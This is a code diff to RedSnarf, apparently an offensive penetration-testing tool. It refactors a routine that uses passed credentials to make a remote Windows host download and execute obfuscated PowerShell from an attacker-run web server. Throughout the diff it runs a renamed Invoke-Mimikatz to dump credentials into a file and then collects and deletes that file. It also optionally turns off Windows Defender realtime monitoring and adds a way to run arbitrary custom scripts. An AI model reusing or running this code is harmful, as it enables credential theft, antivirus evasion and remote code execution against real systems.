@@ -339,6 +339,91 @@ class SAMRDump:
         print("\t[+] Account Lockout Threshold: {0}".format(self.__accnt_lock_thres))
         print("\t[+] Forced Log off Time: {0}".format(self.__force_logoff_time))
 
+def cps(script,flag,invfunc,funccmd,chost,system):
+	try:
+				
+		print colored("[+]Checking for "+script,'green')
+		if not os.path.isfile('./'+script):
+			print colored("[-]Cannot find "+script,'red')
+			exit(1)
+		print colored("[+]Looks good",'green')	
+		
+		#Check to make sure port is not already in use
+		for i in xrange(10):
+			PORT = randint(49151,65535)					
+			proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
+			stdout_value = proc.communicate()[0]
+			if len(stdout_value)>0:
+				break
+
+		my_ip=get_ip_address('eth0')
+		print colored("[+]Attempting to Run "+script,'green')
+		Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
+		httpd = SocketServer.TCPServer(("",PORT), Handler)
+		print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
+		server_process = multiprocessing.Process(target=httpd.serve_forever)
+		server_process.daemon = True
+		server_process.start()	
+		
+		x=' '
+		
+		if flag=="AV":
+			#Get Windows Defender status and store status
+			print colored("[+]Getting Windows Defender Status",'yellow')
+			line="Get-MpPreference | fl DisableRealtimeMonitoring"
+			en = b64encode(line.encode('UTF-16LE'))						
+			
+			proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+			stdout_value = proc.communicate()[0]
+			if "DisableRealtimeMonitoring : False" in stdout_value:
+				print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
+				AVstatus='On'
+			else:
+				print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
+				AVstatus='Off'
+		
+		#Debug
+		#-ConType bind -Port 5900 -Password P@ssw0rd
+		if invfunc =="Invoke-Vnc" and funccmd =="vnc":
+			funccmd="-ConType bind -Port 5900 -Password P@ssw0rd"
+
+		if flag=="AV":
+			#If Windows Defender is turned on turn off 
+			if AVstatus=='On':
+				response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
+				if response in yesanswers:	
+					print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
+					line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
+					en = b64encode(line.encode('UTF-16LE'))						
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+			
+			#Prepare string
+			line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/"+script+"'));"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd
+		else:
+			line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/"+script+"'));"+randint(1,50)*x+invfunc+randint(1,50)*x+funccmd
+		
+		print colored("[+] Using: "+line,'yellow')
+		en = b64encode(line.encode('UTF-16LE'))
+		print colored("[+] Encoding command: "+en,'yellow')
+		
+		if system=="system":
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+		else:
+			os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+		
+		if flag=="AV":
+			#If Windows Defender AV status was on, turn it back on
+			if AVstatus=='On':
+				if response in yesanswers:	
+					print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
+					line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
+					en = b64encode(line.encode('UTF-16LE'))						
+					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+chost+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+	
+	except IOError as e:
+		print "I/O error({0}): {1}".format(e.errno, e.strerror) 
+
+
 #Routine decrypts cpassword values
 def gppdecrypt(cpassword_pass):
 	#Original code taken from the resource below.
@@ -992,87 +1077,26 @@ def datadump(user, passw, host, path, os_version):
 			#Routine runs a stealth mimikatz
 			if stealth_mimi in yesanswers or stealth_mimi=="AV":
 				try:
-					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
-					if not os.path.isfile('./a'):
-						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
-						exit(1)
-					print colored("[+]Looks good",'green')	
-					
-					#Check to make sure port is not already in use
-					for i in xrange(10):
-						PORT = randint(49151,65535)					
-						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if len(stdout_value)>0:
-							break
+					print colored("\n[+]Running Stealth Mimikatz",'blue')
+	
+					shellscript = "a"
+					InvokeFunction = "castell"
+					FunctionCommand = "-Dwmp > c:\\creds.txt"
 
-					my_ip=get_ip_address('eth0')
-					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
-					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-					httpd = SocketServer.TCPServer(("",PORT), Handler)
-					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
-					server_process = multiprocessing.Process(target=httpd.serve_forever)
-					server_process.daemon = True
-					server_process.start()	
-					
-					x=' '
-					
-					if stealth_mimi=="AV":
-						#Get Windows Defender status and store status
-						print colored("[+]Getting Windows Defender Status",'yellow')
-						line="Get-MpPreference | fl DisableRealtimeMonitoring"
-						en = b64encode(line.encode('UTF-16LE'))						
-						
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if "DisableRealtimeMonitoring : False" in stdout_value:
-							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
-							AVstatus='On'
-						else:
-							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
-							AVstatus='Off'
-
-					if stealth_mimi=="AV":
-						
-						#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available						
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
-							print colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green')
-						else:
-							print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green')
-						
-						#If Windows Defender is turned on turn off 
-						if AVstatus=='On':
-							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
-							if response in yesanswers:	
-								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
-								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
-								en = b64encode(line.encode('UTF-16LE'))						
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-						
-						#Prepare string
-						line = "iex ((New-Object System.Net.WebClient).DownloadString('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
+					#If it is a later Windows version check the UseLogonCredentials reg value to see whether cleartext creds will be available						
+					proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" 'cmd /C reg.exe \"QUERY\" \"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\" /v \"UseLogonCredential\"' 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+					stdout_value = proc.communicate()[0]
+					if "UseLogonCredential    REG_DWORD    0x0" in stdout_value:
+						print colored("[-]The reg value UseLogonCredential is set to 0 - no cleartext credentials will be available, use the -rW e/d/q parameter to modify this value",'green')
 					else:
-						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Dwmp > c:\\creds.txt"
+						print colored("[+]UseLogonCredential Registry Value is set to 1 - cleartext credentials will be hopefully be available",'green')
 					
-					print colored("[+] Using: "+line,'yellow')
-					en = b64encode(line.encode('UTF-16LE'))
-					print colored("[+] Encoding command: "+en,'yellow')
-					
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
+					cps(shellscript,stealth_mimi,InvokeFunction,FunctionCommand,host,"system")
+						
 					os.system("/usr/bin/pth-smbclient //"+host+"/c$ -W "+domain_name+" -U "+user+"%"+passw+" -c 'lcd "+outputpath+host+"; get creds.txt\' 2>/dev/null")
 					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd.exe /C del c:\\creds.txt\" 2>/dev/null")
 					
-					if stealth_mimi=="AV":
-						#If Windows Defender AV status was on, turn it back on
-						if AVstatus=='On':
-							if response in yesanswers:	
-								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
-								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
-								en = b64encode(line.encode('UTF-16LE'))						
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-
+					
 					if os.path.isfile(outputpath+host+"/creds.txt"):
 						print colored("[+]creds.txt file found",'green')
 						if not os.path.isfile('/usr/bin/iconv'):
@@ -1085,8 +1109,6 @@ def datadump(user, passw, host, path, os_version):
 							print colored("[+]Basic parsed output:",'green')
 							os.system("cat "+outputpath+host+"/creds1.txt"+" |tr -d '\011\015' |awk '/Username/ { user=$0; getline; domain=$0; getline; print user \" \" domain \" \" $0}'|grep -v \"* LM\|* NTLM\|Microsoft_OC1\|* Password : (null)\"|awk '{if (length($12)>2) print $8 \"\\\\\" $4 \":\" $12}'|sort -u")
 							print colored("[+]Mimikatz output stored in "+outputpath+host+"/creds1.txt",'yellow')
-							print colored("[+]Stopping web server",'green')
-							server_process.terminate()
 					else:
 						print colored("[-]creds1.txt file not found",'red')
 
@@ -1131,76 +1153,15 @@ def datadump(user, passw, host, path, os_version):
 			#Routine starts multi_rdp in conjunction with mimikatz
 			if multi_rdp in yesanswers or multi_rdp=="AV":
 				try:
-					print colored("[+]Checking for Invoke-Mimikatz.ps1",'green')
-					if not os.path.isfile('./a'):
-						print colored("[-]Cannot find Invoke-Mimikatz.ps1",'red')
-						exit(1)
-					print colored("[+]Looks good",'green')	
-					
-					#Check to make sure port is not already in use
-					for i in xrange(10):
-						PORT = randint(49151,65535)					
-						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if len(stdout_value)>0:
-							break
+					print colored("\n[+]Running Mimikatz MultiRDP",'blue')
+	
+					shellscript = "a"
+					InvokeFunction = "castell"
+					FunctionCommand = "-Command \"ts::multirdp\""
 
-					my_ip=get_ip_address('eth0')
-					print colored("[+]Attempting to Run Stealth Mimikatz",'green')
-					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-					httpd = SocketServer.TCPServer(("",PORT), Handler)
-					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
-					server_process = multiprocessing.Process(target=httpd.serve_forever)
-					server_process.daemon = True
-					server_process.start()	
-					
-					x=' '
-					
-					if multi_rdp=="AV":
-						#Get Windows Defender status and store status
-						print colored("[+]Getting Windows Defender Status",'yellow')
-						line="Get-MpPreference | fl DisableRealtimeMonitoring"
-						en = b64encode(line.encode('UTF-16LE'))						
-						
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if "DisableRealtimeMonitoring : False" in stdout_value:
-							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
-							AVstatus='On'
-						else:
-							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
-							AVstatus='Off'
+					cps(shellscript,session_gopher,InvokeFunction,FunctionCommand,host,"system")
 
-					if multi_rdp=="AV":
-						#If Windows Defender is turned on turn off 
-						if AVstatus=='On':
-							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
-							if response in yesanswers:	
-								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
-								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
-								en = b64encode(line.encode('UTF-16LE'))						
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-						
-						#Prepare string
-						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Command \"ts::multirdp\""
-					else:
-						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/a'));"+randint(1,50)*x+"castell"+randint(1,50)*x+" -Command \"ts::multirdp\""
-					
-					print colored("[+] Using: "+line,'yellow')
-					en = b64encode(line.encode('UTF-16LE'))
-					print colored("[+] Encoding command: "+en,'yellow')
-					
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-										
-					if multi_rdp=="AV":
-						#If Windows Defender AV status was on, turn it back on
-						if AVstatus=='On':
-							if response in yesanswers:	
-								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
-								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
-								en = b64encode(line.encode('UTF-16LE'))						
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-										
+					sys.exit()
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
 
@@ -1269,80 +1230,18 @@ def datadump(user, passw, host, path, os_version):
 			#Routine starts Session Goper @arvanaghi
 			if session_gopher in yesanswers or session_gopher=="AV":
 				try:
-					print colored("[+]Checking for SessionGopher.ps1",'green')
-					if not os.path.isfile('./SessionGopher.ps1'):
-						print colored("[-]Cannot find SessionGopher.ps1",'red')
-						exit(1)
-					print colored("[+]Looks good",'green')	
-					
-					#Check to make sure port is not already in use
-					for i in xrange(10):
-						PORT = randint(49151,65535)					
-						proc = subprocess.Popen('netstat -nat | grep '+str(PORT), stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if len(stdout_value)>0:
-							break
+					print colored("\n[+]Running SessionGopher",'blue')
+	
+					shellscript = "SessionGopher.ps1"
+					InvokeFunction = "Invoke-SessionGopher"
+					FunctionCommand = ""
 
-					my_ip=get_ip_address('eth0')
-					print colored("[+]Attempting to Run SessionGopher",'green')
-					Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-					httpd = SocketServer.TCPServer(("",PORT), Handler)
-					print colored("[+]Starting web server:"+my_ip+":"+str(PORT)+"",'green')
-					server_process = multiprocessing.Process(target=httpd.serve_forever)
-					server_process.daemon = True
-					server_process.start()	
-					
-					x=' '
-					
-					if session_gopher=="AV":
-						#Get Windows Defender status and store status
-						print colored("[+]Getting Windows Defender Status",'yellow')
-						line="Get-MpPreference | fl DisableRealtimeMonitoring"
-						en = b64encode(line.encode('UTF-16LE'))						
-						
-						proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
-						stdout_value = proc.communicate()[0]
-						if "DisableRealtimeMonitoring : False" in stdout_value:
-							print colored("[+]Windows Defender RealTimeMonitoring Turned On",'yellow')
-							AVstatus='On'
-						else:
-							print colored("[+]Windows Defender RealTimeMonitoring Turned Off",'yellow')
-							AVstatus='Off'
+					cps(shellscript,session_gopher,InvokeFunction,FunctionCommand,host,"false")
 
-					if session_gopher=="AV":
-						#If Windows Defender is turned on turn off 
-						if AVstatus=='On':
-							response = raw_input("Would you like to temporarily disable Windows Defender Realtime Monitoring: Y/(N) ")
-							if response in yesanswers:	
-								print colored("[+]Turning off Temporarily Windows Defender Realtime Monitoring...",'blue')
-								line="Set-MpPreference -DisableRealtimeMonitoring $true\n"
-								en = b64encode(line.encode('UTF-16LE'))						
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-						
-						#Prepare string
-						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/SessionGopher.ps1'));"+randint(1,50)*x+"Invoke-SessionGopher"+randint(1,50)*x+" \"-Thorough\""
-					else:
-						line = "iex ((&(`G`C`M *w-O*) \"N`Et`.`WeBc`LiEnt\").\"DO`wNlo`AdSt`RiNg\"('http://"+str(my_ip).rstrip('\n')+":"+str(PORT)+"/SessionGopher.ps1'));"+randint(1,50)*x+"Invoke-SessionGopher"+randint(1,50)*x+" \"-Thorough\""
-					
-					print colored("[+] Using: "+line,'yellow')
-					en = b64encode(line.encode('UTF-16LE'))
-					print colored("[+] Encoding command: "+en,'yellow')
-					
-					os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-										
-					if session_gopher=="AV":
-						#If Windows Defender AV status was on, turn it back on
-						if AVstatus=='On':
-							if response in yesanswers:	
-								print colored("[+]Turning back on Windows Defender Realtime Monitoring...",'blue')
-								line="Set-MpPreference -DisableRealtimeMonitoring $false\n"
-								en = b64encode(line.encode('UTF-16LE'))						
-								os.system("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall --system \/\/"+host+" \"cmd /c echo . | pow^eRSheLL^.eX^e -NonI -NoP -ExecutionPolicy ByPass -E "+en+"\" 2>/dev/null")
-										
+					sys.exit()
 				except OSError:
 					print colored("[-]Something went wrong here...",'red')
-
-
+			
 			#Routine will screen shot all logged on users desktops
 			if screenshot in yesanswers:
 				loggeduser1=""
@@ -1970,7 +1869,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4n", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.4o", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
@@ -1988,6 +1887,7 @@ cgroup.add_argument("-cS", "--skiplsacache", dest="skiplsacache", default="n", h
 ugroup = p.add_argument_group('Utilities')
 ugroup.add_argument("-uA", "--auto_complete", dest="auto_complete", default="n", help="<Optional> Copy autocomplete file to /etc/bash_completion.d ")
 ugroup.add_argument("-uC", "--clear_event", dest="clear_event", default="n", help="<Optional> Clear event log - application, security, setup or system")
+ugroup.add_argument("-uCP", "--custom_powershell", dest="custom_powershell", default="n", help="<Optional> Run Custom Powershell Scripts found in the RedSnarf folder")
 ugroup.add_argument("-uCIDR", "--cidr", dest="cidr", default="", help="<Optional> Convert CIDR representation to ip, hostmask, broadcast")
 ugroup.add_argument("-uD", "--dropshell", dest="dropshell", default="n", help="<Optional> Enter y to Open up a shell on the remote machine")
 ugroup.add_argument("-uE", "--empire_launcher", dest="empire_launcher", default="n", help="<Optional> Start Empire Launcher")
@@ -2112,6 +2012,7 @@ split_spn=args.split_spn
 sendspntojohn=args.sendspntojohn
 auto_complete=args.auto_complete
 session_gopher=args.session_gopher
+custom_powershell=args.custom_powershell
 
 #Check Bash Tab Complete Status and Display to Screen
 print colored("[+]Checking Bash Tab Completion Status",'yellow')
@@ -2471,6 +2372,22 @@ elif remotetargets[0:8]=='nmapxml=':
 		sys.exit()	
 
 	print colored("[+]Parsed Nmap output and found "+str(len(targets))+" target(s) in xml file\n",'yellow')
+
+
+#Routine starts Custom Powershell Script
+if custom_powershell in yesanswers or custom_powershell=="AV":
+	print colored("[+]Run Custom Powershell Script",'green')
+		
+	print colored("[+]Scripts in RedSnarf folder",'blue')
+	os.system("ls *.ps1")
+
+	shellscript = raw_input("\nPlease enter the Powershell Script to run: ")
+	InvokeFunction = raw_input("Please enter the function to Invoke: ")
+	FunctionCommand = raw_input("Please enter the command to run: ")
+
+	cps(shellscript,custom_powershell,InvokeFunction,FunctionCommand,targets[0],"false")
+
+	sys.exit()
 
 #Function enables connecting to remote RDP sessions without authenticating as the user who the session belongs to.
 if rdp_connect in yesanswers or "ID" in rdp_connect:
